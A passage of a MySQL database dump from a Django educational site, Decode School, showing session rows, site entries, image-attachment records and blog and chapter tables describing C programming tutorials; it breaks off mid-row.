05:53:57.045581'),('pashv0y0l4r7ci0ddwfh3w0if710f0dz','.eJxVjEEOwiAURO_C2hAo8KEu3fcM5AO_UjWQlHZlvLs06UJXk8x7M2_mcd-y3xutfknsyhQAu_y2AeOTyoHSA8u98ljLti6BHwo_aeNTTfS6ne7fQcaW-1qCjCppO1hDSDYanAcAcFKOxjq0CjUFI2zHpHs6B8I5LaISYRY0ss8XDv03MQ:1stgz6:1JLVHRohAkR54lObPPzmB-ahfvKrCocfhAM9eC6eNmQ','2024-10-10 05:24:12.318778'),('ggzukjv8z14o2dzcejppvvkh65ku39x0','.eJxVjMsOwiAQRf-FtSGMUB4u3fcbyDCDUjWQlHZl_HfbpAvdnnPufYuI61Li2vMcJxYXoa0Tp1-akJ657oofWO9NUqvLPCW5J_KwXY6N8-t6tH8HBXvZ1g4MEmQ9WBx0uBEChKDIGZ82QMhoHGbr-ZyMSqSyC9YDM3AAJo_i8wU2zzjF:1sth06:n3HKjIVjuhnxE_HnpKw6wSSRrsmiM_-V7MODa18Dy-k','2024-10-10 05:25:14.503905'),('waadoy5jr2xxbyw94b88drt87iy2hrl3','.eJxVjEEOwiAQRe_C2hDGQWBcuu8ZmoFBqRpISrsy3l2bdKHb_977LzXyupRx7XkeJ1FnhSejDr9r5PTIdUNy53prOrW6zFPUm6J32vXQJD8vu_t3ULiXb005IEgKAB6yEbRors4mQGKOERNaAkdH9h4NGBNZgoBDmzwRE7J6fwAPPzdm:1suPxo:t1Wzk3GNuUlX3xhjJ3WtQmQ7dX2mlwExhGp9vFAK88s','2024-10-12 05:25:52.642072'),('kwlsi3g1ge6bobaynwfl3u2gra6fvfju','.eJxVzMEOwiAQBNB_4WyIbIGCR-9-A1mWRaoGktKejP9um_Sg15k38xYB16WEtfMcpiQuYrBanH7TiPTkulfpgfXeJLW6zFOUO5FH2-WtJX5dD_t3ULCXbY1gR9DsiVF5DR68Ss4B5mgduDiigUicCGjQ8Uw5Z682ukFnNBsvPl8ynDh5:1suPy7:Hl-OhWGDeo1H9a-Wl43EBNR1UKP0yIm0ccgx1IXFJFc','2024-10-12 05:26:11.185739'),('zalv3t6k3zn23ixb8zpscjhsi0q4j6mc','.eJxVjTsOgzAQRO_iOrL8gfUqZfqcwVq8S0wS2RKGCuXuAYkiaee9mdlUpHXJcW0yx4nVVXlAdflNB0ovKQfiJ5VH1amWZZ4GfSj6pE3fK8v7drp_A5la3tuAyICJxRkCSyl01kgiEwJYHNkHcNz7_Z7JIuAormNHEkwvjow49fkCKf04Dg:1sy5Nh:cocQzKUBr0lZyyVPmQBx5dUCr4xgmXfHYBf1mEwfR4k','2024-10-22 08:15:45.814671'),('06e7km3qeon4widilshz95uh7l61tn15','.eJxVjDEOwyAQBP9CHaEDbA5SpvcbEMdBcBLZkrGrKH-PLblImi12ZvctQtzWGraWlzCyuApjvbj8thTTM08H4kec7rNM87QuI8lDkSdtcpg5v26n-3dQY6v7WhmfIznKCHvoxD2oHjShIwUaPWLusEToVG-AvEvFgmKjuWO2RaP4fAEnqzfX:1t0C17:cbR06f9s5XHI5hbY4-FGf-TvJ0S7qeSR5EGxuDXVQww','2024-10-28 03:45:09.987415'),('sar417hzl72ug4cw74cv0v3ydoqlygy3','.eJxVjMsOwiAQRf-FtSEyvF267zcQYBipGkhKuzL-uzbpQrf3nHNfLMRtrWEbZQkzsguT9sxOv2uK-VHajvAe263z3Nu6zInvCj_o4FPH8rwe7t9BjaN-6wRCSK-MsDkTWXLKg5WUAZwBUIbAKBfRIoF2xmvnE5CBopV1gJTY-wMKKzd0:1t1Lsa:EmznOGp272gjJrbqWvRz0tWYLtUA9XJAWx2O3b0-XpM','2024-10-31 08:29:08.702997'),('wiijgwm46d6vipop5gy3vpweq20irmn6','.eJxVjEEOwiAQAP_C2RCghYJH731Ds8vu2qqBpLQn499Nkx70OjOZt5pg3-Zpb7xOC6mr6ganLr8UIT-5HIoeUO5V51q2dUF9JPq0TY-V-HU727_BDG0-xhLFe5MCJxgSGzTOSwypN5iIIZMIorfRI1gvLgcKPbkuW-474WjU5ws9ijjZ:1t1LhK:-oS4NgZgmXgGonGmESKAXHASJ-1yIMamT46MnugKNLI','2024-10-31 08:17:30.294567'),('slp6e5fstmksboltpic628sz9hura0a2','.eJxVjDsOwjAQBe_iGllx_A0lPWewdtdrHEC2FCcV4u4QKQW0b2beS0TY1hK3zkuckzgL7bU4_a4I9OC6o3SHemuSWl2XGeWuyIN2eW2Jn5fD_Tso0Mu39oq10iEbJOSk8sQDAfkMBiGx15NDsjZ7kxiQcsg2jIHtMDqjyDsQ7w9qNTmU:1tkj86:pAD8MC-J-LRx2D7rIyoWKcNlFVbuU5JwuAPdouryfZg','2025-03-05 12:24:42.533471'),('e34xhwznd5trj9fenzg9dl4347t7wylg','.eJxVjEEOwiAQRe_C2pAZhAAu3XsGwjBTqRqalHZlvLtt0oVu_3vvv1XK61LT2mVOI6uLMur0u1EuT2k74Edu90mXqS3zSHpX9EG7vk0sr-vh_h3U3OtWoxRrjZzBI4gjRkKMEAjA4ABDLBjJOnJkOLJkHxl9CBtAtiagVZ8vzkA3Lg:1tway5:F71qRtpimp9mYQMCCo2gKeQML1dI4Jts7-Ihna-vii0','2025-04-07 06:07:25.788979'),('2uf0qxpsfe18rzmp4r5lojp9o6gb4qmr','.eJxVjEEOwiAQRe_C2hAgMIBL956BDMwgVUOT0q6Md9cmXej2v_f-SyTc1pa2wUuaSJyFNlGcfteM5cF9R3THfptlmfu6TFnuijzokNeZ-Hk53L-DhqN966hyZB2ICMhAtqhYMZfqggfKMYACQvYOEI2FioGstx6zqdZpx168P082ON0:1ty5vG:CWXovkVqO4rKz-VRWG_LPo37-_ykQ-sEQYJKw1od1WM','2025-04-11 09:22:42.220429'),('rnvf37mfpzdzk127646yl6ucpsojp9sc','.eJxVjDsOwyAQRO9CHSG-BlKm9xnQsgvBSYQlY1dR7h5bcpEU08x7M28WYVtr3Hpe4kTsyrQz7PLbJsBnbgeiB7T7zHFu6zIlfij8pJ2PM-XX7XT_Dir0uq-9STRoIYMyxmUsRWmUztohBYFFY0BwyiYqe4JIAUQu2miHCrz0ZNnnCy4rOHE:1u5csf:p1JXOmbdp87dql_d5vdqwYPWrWGLoHAq20lcvRz7wTw','2025-05-02 03:59:09.468734'),('e7v4ubas8irvkg63x9dct28x9pnjgy7v','.eJxVjMsOwiAQRf-FtSG8YVy69xvIwFCpGkhKuzL-uzbpQrf3nHNfLOK21riNssSZ2Jlpb9npd02YH6XtiO7Ybp3n3tZlTnxX-EEHv3Yqz8vh_h1UHPVbe5mUM9kqCaShSFeCzEpDJuER8wQAwZAHI8BL0Ea4AmhJ4eSUCdaw9wcRPjc9:1uJUbZ:thJpiOL06dWY2XL1JWSSEDEBnJYhzxswkG-ox4UNRVM','2025-06-09 09:58:49.280046'),('5o7eki7i5d3mm6azcf7bj3dk99m5l4vl','.eJxVjDsOwjAQBe_iGlm7SfwJJT1niHa9Ng4gW4qTCnF3iJQC2jcz76Um2tY8bS0u0yzqrHpn1el3ZQqPWHYkdyq3qkMt6zKz3hV90KavVeLzcrh_B5la_tY-AfBADqxBCCJoPRIFkC6NLBYt9uQwEfUDw9hxAsSEjK5Lxhn06v0BLJU34g:1uJUe0:Xu7-Y10yF6xLNEp-vNNdz0OrApKlZPrH32Ygyukj3yc','2025-06-09 10:01:20.306780'),('r8udmefngjeq4kkod8trfd497tjgoir7','.eJxVjEEOwiAQRe_C2hBggCku3XsGMpRRqgaS0q6Md7dNutDtf-_9t4i0LiWunec4ZXEWgChOv2ui8cl1R_lB9d7k2OoyT0nuijxol9eW-XU53L-DQr1stUO2qFCz90pTMNkzD9bdAFSwjgdy1njSGQODJWONSaA4Odh85wOKzxcECjbJ:1uKDuH:GJR1zkRbLmQt4pegoiVVYfRexDDkw5254Kzll9QUekc','2025-06-11 10:21:09.839544'),('1nem76chxfgxazhoobm7dv73c80dysce','.eJxVjMsOwiAQRf-FtSHlUZhx6d5vIMwAUjU0Ke3K-O_apAvd3nPOfYkQt7WGreclTEmchfEgTr8rRX7ktqN0j-02S57bukwkd0UetMvrnPLzcrh_BzX2-q0xj6oo9MVYPyrUg9PIkJDLYJ1BR8AZlOEcDWhOFpi812RSsUDEVrw_Fzk4Lg:1uKFNA:yZUdFhlf1uFemwXvRuxptvXEvs-yD1PbnfHJzwI9Gxc','2025-06-11 11:55:04.122299'),('8t4k6ltj0ig1ejd8fdlte4uws16phbkx','.eJxVjDsOwjAQRO_iGln-fyjpOYO16zU4gGwpTirE3UmkFFCNNO_NvFmCdalpHWVOE7Ez0z6y02-LkJ-l7Yge0O6d596WeUK-K_ygg187ldflcP8OKoy6rSPaguBuxiGq4JWJMmYgcFva4G0GITUVJUxGkhKF0cFqq71QlJ2w7PMFMpM3pA:1uKFRB:xTj4KeH2lR-Zd9r7j4PMLpCZxYrm9klqRH2Ug7aVgaM','2025-06-11 11:59:13.704564'),('nu8oesypkf0c3bfoh4dc78rspijac7ac','.eJxVjDsOwjAQBe_iGlnWrr-U9JzB2vUHB5AjxUmFuDtESgHtm5n3EpG2tcVtlCVOWZwFeiVOvytTepS-o3ynfptlmvu6TCx3RR50yOucy_NyuH8HjUb71hVQAxStA6N3KTO5bEwB7y2TDxSyBRvQVaeDqcpZRCAuVEkxVIPi_QEjEDgf:1uKFRK:3h2tMyc8DUOmUhhKB9Te5tqMCsqzc3AfV19LDJA7TPQ','2025-06-11 11:59:22.135945'),('ze5054sczjn7f13zs7e6j6626l5pf6v7','.eJxVjE0OgjAYRO_StWnaQktx6Z4zNN8fgpo2obAy3l1IWGhmN-_NvFWCbZ3SVmVJM6uraqJVl98WgZ6SD8QPyPeiqeR1mVEfij5p1UNhed1O9-9ggjrta8eGracOjAthtGFPZNMKsRvJQkPU994xoCB1LkIIiITYSyvSsDfq8wU8FTlD:1uKFRW:DmvILG49_oz4w5QQu41ERG21PRv2DlMuSVyeJeDLQek','2025-06-11 11:59:34.099938'),('2sx6n69576fjybm9kli3idbqdybp46bc','.eJxVjEEOwiAQRe_C2hAGgjAu3XsGMsyAVE2blHbVeHdt0oVu_3vvbyrRurS09jKnQdRFuWjV6XfNxM8y7kgeNN4nzdO4zEPWu6IP2vVtkvK6Hu7fQaPevrWJNnNxBg16phi8weABwYgQCwcoIJCrccSMEAM5tNbVCKHWiP6s3h8hdTfi:1uKFqc:QgikjkcAaKUn6mzoc409XAX1hTNfxhd6l9-FnRvIe3Y','2025-06-11 12:25:30.060420'),('ktr35o64a6g9rl77uegjg5vjkbt7cs20','.eJxVjEEOwiAQRe_C2hCGoe3g0r1nIMwAUjVtUtqV8e7apAvd_vfef6kQt7WGreUljEmdFRKq0-_KUR552lG6x-k2a5mndRlZ74o-aNPXOeXn5XD_Dmps9VsbO7Aj60wh6AoyIgtEUzyCoAcBzxYdWvZSeoOdEBP1ApAKk6RBvT8NkDfP:1uKFzZ:6CzpBBOsFO7o6DLjedyJjtfFU3YS4KQ_axNhnH5qbk8','2025-06-11 12:34:45.516640'),('e8q57gfcxqkr91ns4ca3msjk14h6ohx4','.eJxVjEEOwiAQRe_C2hAGgjAu3XsGMsyAVE2blHbVeHdt0oVu_3vvbyrRurS09jKnQdRFuWjV6XfNxM8y7kgeNN4nzdO4zEPWu6IP2vVtkvK6Hu7fQaPevrWJNnNxBg16phi8weABwYgQCwcoIJCrccSMEAM5tNbVCKHWiP6s3h8hdTfi:1uKG0L:cXnplejrFIWED60_v31l9aQVo08qO0DDiQ4bAG8PuLU','2025-06-11 12:35:33.624282'),('u97zj6e8vjnkbbdmzj4kk1oj5sqb5oqj','.eJxVjEEOwiAQRe_C2hBggCku3XsGMpRRqgaS0q6Md7dNutDtf-_9t4i0LiWunec4ZXEWgChOv2ui8cl1R_lB9d7k2OoyT0nuijxol9eW-XU53L-DQr1stUO2qFCz90pTMNkzD9bdAFSwjgdy1njSGQODJWONSaA4Odh85wOKzxcECjbJ:1uKGB7:n9pYqkxMOivqYmoVILDPadtKMHuhtOy65fYJ51pJPsA','2025-06-11 12:46:41.961235'),('9yct0dkt5hw0jkepqarf6r62wg4am13h','.eJxVjDkOwjAUBe_iGlmJd1PSc4bob8YBlEhxUiHuDpFSQPtm5r3UANtah63JMoyszsomp06_KwI9ZNoR32G6zZrmaV1G1LuiD9r0dWZ5Xg7376BCq9-698ZyKJKJMPYOu0SBDdkcswlcHCBjiAUNFuMx9MUaIOmSOGAPAur9AUnHOYQ:1uKGOt:J23RitFXNgZsj1RdhKyNBKSJRZ9OvcSgaGM-mEvfEfE','2025-06-11 13:00:55.496433'),('s0yi1zy2oohd9a403gzc58sib8dj4ozm','.eJxVjEEOwiAQRe_C2hCww0BduvcMZBhAqgaS0q6Md7dNutDtf-_9t_C0LsWvPc1-iuIiBmfE6XcNxM9UdxQfVO9NcqvLPAW5K_KgXd5aTK_r4f4dFOplq4lN1qOjCANbCwaVGoCZcyBnyAQEqzauztlyIpVHlzMiAmjQFADF5ws0VTgS:1uKGWL:Ev2TXdL1KkRIwz2GKs5hYnzVMs7hz2AJoIxCU_8d2A8','2025-06-11 13:08:37.298046'),('t2qelec6eda1k41343rer5q1jpj88kh9','.eJxVjDsOgzAQRO_iOrJsL9g4ZXrOYA3rJZBERuJTRbl7QKJIutG8N_NWCds6pG2ROY1ZXRU1Xl1-2w78lHKg_EC5T5qnss5jpw9Fn3TR7ZTldTvdv4MBy7CvA_WOuQkSOotsiASoXIiwMdYWFsFE5w0b6ZGrGpYzgyjWInvwXn2-PNQ46w:1uKGbX:xYQA_kUwaMpGpzpkKYY0wdAhLxgcyUsH4gjs3lZexvU','2025-06-11 13:13:59.093314'),('2gevjl87m4d5be7yi7peyqw1qtcc86e9','.eJxVjDsOwjAQBe_iGllxdv2jpOcM1npt4wBypDipEHeHSCmgfTPzXiLQttaw9byEKYmzAGfF6XeNxI_cdpTu1G6z5LmtyxTlrsiDdnmdU35eDvfvoFKv37pQAU0GgEeyjDoarTLhqC0yO1RkaYDisyvJK5PIIzIMxkNiY2wk8f4APGs4cw:1uKGfj:CzRwvRMF84lT3ZNs49_13lSWBGgXXkaCbouWYz9JcyA','2025-06-11 13:18:19.969165'),('lfo5o3jp8hpeqkf38lgac9sfk9nc4q0m','.eJxVjMsOwiAQRf-FtSEIDA-X7v0GMjBUqgaS0q6M_y5NutDtOefeNwu4rSVsPS9hJnZhyjl2-qUR0zPXXdED673x1Oq6zJHvCT9s57dG-XU92r-Dgr2MtUZD0QpSKJw00oPwqJRPoLXXXmQNg9lEmN1k5VknC0NLigYEOJjY5wsJfDcF:1uKGpz:xZNxc6szz_ajcmMus3elL1gDtmEffJ0WSScDev5qtZc','2025-06-11 13:28:55.559202'),('6dzb3y5s7xo4v9y3qwfmjoe7yyo1xnzc','.eJxVjDsOwjAQBe_iGlnWrr-U9JzB2vUHB5AjxUmFuDtESgHtm5n3EpG2tcVtlCVOWZwFeiVOvytTepS-o3ynfptlmvu6TCx3RR50yOucy_NyuH8HjUb71hVQAxStA6N3KTO5bEwB7y2TDxSyBRvQVaeDqcpZRCAuVEkxVIPi_QEjEDgf:1uKHev:HyqlTJzCEn8IMaJqDffQrjFs6usaVS5IDie48XBCnaM','2025-06-11 14:21:33.026877'),('lzd1orf1zy7yr1oj1x9fl8xl2zwjenkw','.eJxVjEEOgjAURO_StWksn9Li0j1nIP9PW0FNm1BYGe-uJCx0O--9eamRt3UatxqXcQ7qosj36vS7CuMR847CnfOtaJS8LrPoXdEHrXooIT6vh_t3MHGdvrV3goZh2sTJIwW2trdovCUSANQ1Zy-pF5bOE7WGXDQODiIwINeq9wdYgTj8:1uKInE:HscJ6n9fRwKNNw3ABGH6ZgZHeeUEmnMxKfVXBlpaPQw','2025-06-11 15:34:12.795628'),('jiknmeb87mvnugbneiqtadczdzufcu8r','.eJxVjEEOwiAQRe_C2hBgGOy4dO8ZGmAGqZo2Ke3KeHdD0oVu_3vvv9UY962Oe5N1nFhdFJBRp981xfyUuSN-xPm-6LzM2zol3RV90KZvC8vrerh_BzW22utQICAhifWZItqC2TMNSSwJuSDARQybwQEjsCnOe8dY4IyAAll9vi9VOCM:1uKKS5:3BDO1vnb7vR9dNWzQexKdnvObYepqZgoEXtd5-WsRts','2025-06-11 17:20:29.686857'),('t8gqfnzjqukyoyegknmeo0bmfi8p2i4d','.eJxVjEEOwiAQRe_C2hCYUoZx6d4zEMqAVA0kpV0Z765NutDtf-_9l_BhW4vfelr8zOIsBtLi9LtOIT5S3RHfQ701GVtdl3mSuyIP2uW1cXpeDvfvoIRevnW0QGY0hFkxjJBj1tY4ZcGRQgNGW5cBmTHp4DATAE4aByLNCQxn8f4A-fw3Dw:1uKbnT:tsm-do4OjCE4KUcRibUooUtfy1XbBpLarikm_ZHWn6Y','2025-06-12 11:51:43.883251');
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_site`
--

DROP TABLE IF EXISTS `django_site`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_site` (
  `id` int NOT NULL AUTO_INCREMENT,
  `domain` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `name` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_site_domain_a2e37b91_uniq` (`domain`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_site`
--

LOCK TABLES `django_site` WRITE;
/*!40000 ALTER TABLE `django_site` DISABLE KEYS */;
INSERT INTO `django_site` VALUES (1,'example.com','example.com'),(2,'decodeschool.com','Decode School'),(3,'decodeschool.myboon.org','Decode');
/*!40000 ALTER TABLE `django_site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_summernote_attachment`
--

DROP TABLE IF EXISTS `django_summernote_attachment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `django_summernote_attachment` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `file` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `uploaded` datetime(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_summernote_attachment`
--

LOCK TABLES `django_summernote_attachment` WRITE;
/*!40000 ALTER TABLE `django_summernote_attachment` DISABLE KEYS */;
INSERT INTO `django_summernote_attachment` VALUES (1,'console.jpg','django-summernote/2020-06-02/d55fe83b-6316-44e3-b38a-af21bd9e4351.jpg','2020-06-02 14:31:56.450085'),(2,'ex1.jpg','django-summernote/2020-06-02/64b7dd9b-75a8-4db4-a10e-094bedc01ad5.jpg','2020-06-02 14:32:56.810538'),(3,'ex2.jpg','django-summernote/2020-06-02/1080b166-8fa1-4b95-bf64-c78d68c0ce0d.jpg','2020-06-02 14:33:27.936318'),(4,'ex3.jpg','django-summernote/2020-06-02/77b42222-3e15-4c9f-9c60-f7a0f47bb5b5.jpg','2020-06-02 14:33:57.728022'),(5,'ex6.jpg','django-summernote/2020-06-02/0fd9569b-34a5-436a-bbf8-4d50c05228d7.jpg','2020-06-02 14:34:14.038955'),(6,'ex7.jpg','django-summernote/2020-06-02/170bedcc-d8a3-48d2-942d-d5eae370dcbf.jpg','2020-06-02 14:34:27.832744'),(7,'ex9.jpg','django-summernote/2020-06-02/478ccea4-aeca-4982-a2e0-77b4769677a4.jpg','2020-06-02 14:35:08.290058'),(8,'ex7.jpg','django-summernote/2020-06-02/d495f6bb-815f-4308-b40b-9431bd672a1c.jpg','2020-06-02 14:35:29.239256'),(9,'ex8.jpg','django-summernote/2020-06-02/259c305d-d85f-41cf-bb36-0b04bd77e770.jpg','2020-06-02 14:35:45.174167'),(10,'ex10.jpg','django-summernote/2020-06-02/bc4b4967-20f5-47b9-8812-cce373d1f3a0.jpg','2020-06-02 14:36:02.055133'),(11,'ex11.jpg','django-summernote/2020-06-02/99898746-a017-409d-b0aa-a2ab9a0c4346.jpg','2020-06-02 14:36:18.452071'),(12,'console.jpg','django-summernote/2020-06-02/0a8ba478-b0e4-4d09-9c84-51b8d257c7e3.jpg','2020-06-02 17:38:06.333966'),(13,'ex2.jpg','django-summernote/2020-06-02/71362881-dc75-481d-9fca-07c348452f17.jpg','2020-06-02 17:38:16.660557'),(14,'ex1.jpg','django-summernote/2020-06-02/828cc5ea-88a8-468c-ac13-a725b52f77d8.jpg','2020-06-02 17:38:30.010320'),(15,'ex2.jpg','django-summernote/2020-06-02/d7b68cef-620b-4e25-9ad9-45681643a95c.jpg','2020-06-02 17:38:43.172073'),(16,'ex3.jpg','django-summernote/2020-06-02/622a3f7a-46fd-4eb3-ae66-f000d8f3ef47.jpg','2020-06-02 17:39:06.540410'),(17,'ex6.jpg','django-summernote/2020-06-02/afe1d884-c1b8-427a-a277-5358dd61d17b.jpg','2020-06-02 17:39:34.622016'),(18,'ex9.jpg','django-summernote/2020-06-02/51ef1ee0-54d3-4c4a-8509-d10c736500bb.jpg','2020-06-02 17:39:56.318257'),(19,'ex7.jpg','django-summernote/2020-06-02/52ef4073-e7d1-4c44-9e23-c9915f5a4a84.jpg','2020-06-02 17:40:40.233769'),(20,'ex9.jpg','django-summernote/2020-06-02/9b01a800-3043-412e-b501-23b034d9bc03.jpg','2020-06-02 17:41:01.126964'),(21,'ex8.jpg','django-summernote/2020-06-02/a64c2020-d460-42ae-ad1e-9929b163e9aa.jpg','2020-06-02 17:41:16.012815'),(22,'ex10.jpg','django-summernote/2020-06-02/715eebba-b98d-46fa-b7cc-72669e6fe3f1.jpg','2020-06-02 17:41:30.370636'),(23,'ex11.jpg','django-summernote/2020-06-02/c7f2c4d6-e9eb-4d1e-b2ee-7600147e0390.jpg','2020-06-02 17:41:47.914640'),(24,'image.png','django-summernote/2022-07-27/d148960c-5887-40d4-9bd6-c03e09713c6f.png','2022-07-27 04:32:56.013627'),(25,'image.png','django-summernote/2022-07-27/85715eed-3dde-4488-9ba4-bed1bd46a3fa.png','2022-07-27 05:32:54.182721'),(26,'85715eed-3dde-4488-9ba4-bed1bd46a3fa.png','django-summernote/2022-07-27/e7f0a448-9d1b-4d2a-8198-fce18447965e.png','2022-07-27 05:33:02.924502'),(27,'image.png','django-summernote/2022-07-27/fc196ccd-08da-4c35-976b-1a0e1cc261c0.png','2022-07-27 06:10:27.710773'),(28,'image.png','django-summernote/2022-07-27/e3215a08-ada5-47ad-b797-6385f8bf92e0.png','2022-07-27 06:11:11.937974'),(29,'fc196ccd-08da-4c35-976b-1a0e1cc261c0.png','django-summernote/2022-07-27/df81995b-a051-4464-a56e-5f5e0f99768a.png','2022-07-27 06:11:17.476271'),(30,'fc196ccd-08da-4c35-976b-1a0e1cc261c0.png','django-summernote/2022-07-27/5f940a92-f000-449a-95a2-02c70ebc1e3f.png','2022-07-27 06:11:32.812612'),(31,'image.png','django-summernote/2022-07-27/04594700-2de2-47fc-b86c-b20e79ba753a.png','2022-07-27 06:12:58.383038'),(32,'image.png','django-summernote/2022-07-27/0190939e-c799-48ef-8d25-29d9e3f070bb.png','2022-07-27 07:20:58.907064'),(33,'image.png','django-summernote/2022-07-27/1d3d18d3-2371-473d-8c8b-871ffc399004.png','2022-07-27 07:21:24.668676'),(34,'image.png','django-summernote/2022-07-27/f607f4c7-0654-4bcc-8ed0-a5c3fbaca60c.png','2022-07-27 07:21:58.328028'),(35,'image.png','django-summernote/2022-07-27/bf42fb58-d87f-4ab0-a3cd-101bef9c53bb.png','2022-07-27 07:22:33.479301'),(36,'image.png','django-summernote/2022-07-27/2b55890a-e3b4-4e78-b75d-7d8d9ab4514d.png','2022-07-27 07:22:58.872951'),(37,'image.png','django-summernote/2022-07-28/9d1892db-9922-47b2-a2c2-a6d11fba7367.png','2022-07-28 12:30:53.132361');
/*!40000 ALTER TABLE `django_summernote_attachment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_blog`
--

DROP TABLE IF EXISTS `example_app_blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_blog` (
  `id` int NOT NULL AUTO_INCREMENT,
  `blog_name` varchar(20) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `slug` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `author` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `example_app_blog_slug_a02bcab5` (`slug`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_blog`
--

LOCK TABLES `example_app_blog` WRITE;
/*!40000 ALTER TABLE `example_app_blog` DISABLE KEYS */;
INSERT INTO `example_app_blog` VALUES (1,'Text Mining','Text-Mining','P N Ramesh'),(2,'Python Tutorial','python','P N Ramesh'),(3,'OOPS in Java','oops-in-java','P N Ramesh'),(4,'Database Management','database-management','P N Ramesh'),(6,'Operating Systems','os-case-study','P N Ramesh');
/*!40000 ALTER TABLE `example_app_blog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_chapter`
--

DROP TABLE IF EXISTS `example_app_chapter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_chapter` (
  `id` int NOT NULL AUTO_INCREMENT,
  `chapter_no` int NOT NULL,
  `chapter_title` varchar(50) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `reference` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `course_id` int NOT NULL,
  `slug` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `exercise` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `featured_image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `example_app_chapter_course_id_b15f5e7d` (`course_id`),
  KEY `example_app_chapter_slug_1d4c1708` (`slug`)
) ENGINE=MyISAM AUTO_INCREMENT=33 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_chapter`
--

LOCK TABLES `example_app_chapter` WRITE;
/*!40000 ALTER TABLE `example_app_chapter` DISABLE KEYS */;
INSERT INTO `example_app_chapter` VALUES (1,1,'Language Basics','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">This chapter describes basic Structure of C programming, IO operations, Variables, Data types and format specifiers of C Programming. Codes with explanation were given to illustrate the above topics in detail.</span><br></p>',3,'Language-Basics',NULL,NULL),(2,2,'Operators','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">C has various operator types like Arithmetic Operators, relational Operators, Logical Operator, Bit wise operator and Assignment Operator. This Chapter concentrates on Arithmetic Operators and Bit wise operators of C programming.</span><br></p>',3,'Operators',NULL,NULL),(3,3,'Branching','<p><span style=\"color: rgb(51, 51, 51); font-size: 18px; text-align: justify;\">Branching Statements are decision making statements, which decide the flow of program execution. Here various coded examples were given to illustrate if, if-else, if-else-if, nested if and switch statements in C Programming.</span><br></p>',3,'Branching',NULL,NULL),(4,4,'Looping','<p>Looping statements or Iterative statements executes the sequence of instruction for multiple times. Decode School provides multiple examples in looping statements “for” and “while”. Given examples make you to learn C programming syntax and logic building for problem solving.<br></p>',3,'Looping',NULL,NULL),(5,5,'Arrays','<p>Array is a collection of elements with same type. Array has Contiguous memory locations; array reduces your program length. Several examples were discussed here to&nbsp; &nbsp;illustrate arrays in c and how to solve problems using array. These examples are foundation for problem solving, which help you in solving bigger problems.<br></p>',3,'Arrays',NULL,NULL),(6,6,'Strings','<p>String is a collection off character. String has Contiguous memory locations; String reduces your program length. Several examples were discussed here to&nbsp; &nbsp;illustrate Strings in c and how to solve problems using array. These examples are foundation for problem solving, which help you in solving bigger problems.<br></p>',3,'Strings',NULL,NULL),(7,7,'Pointers','<p>Pointers are variables which stores address of another variable. Pointer is used for dynamic memory allocations. Examples discussed here give you a knowledge on Pointers, how to use pointer as an array.<br></p>',3,'Pointers',NULL,NULL),(8,8,'Structures and Unions','',3,'Structures-and-Unions',NULL,NULL),(9,9,'File Operations','',3,'File-Operations',NULL,NULL),(10,1,'Working with Factors','',4,'Working-with-Factors',NULL,NULL),(11,2,'Working with Digits','',4,'Working-with-Digits',NULL,NULL),(12,3,'Interesting Pattern Programming','',4,'Interesting-Pattern-Programming',NULL,NULL),(13,4,'Number Pattern Programming','',4,'Number-Pattern-Programming',NULL,NULL),(14,1,'Format Specifiers | Language Basics','',5,'Format-Specifiers-Language-Basics',NULL,NULL),(15,2,'Operators','',5,'Operators',NULL,NULL),(16,3,'Branching Statements','',5,'Branching-Statements',NULL,NULL),(17,4,'Looping 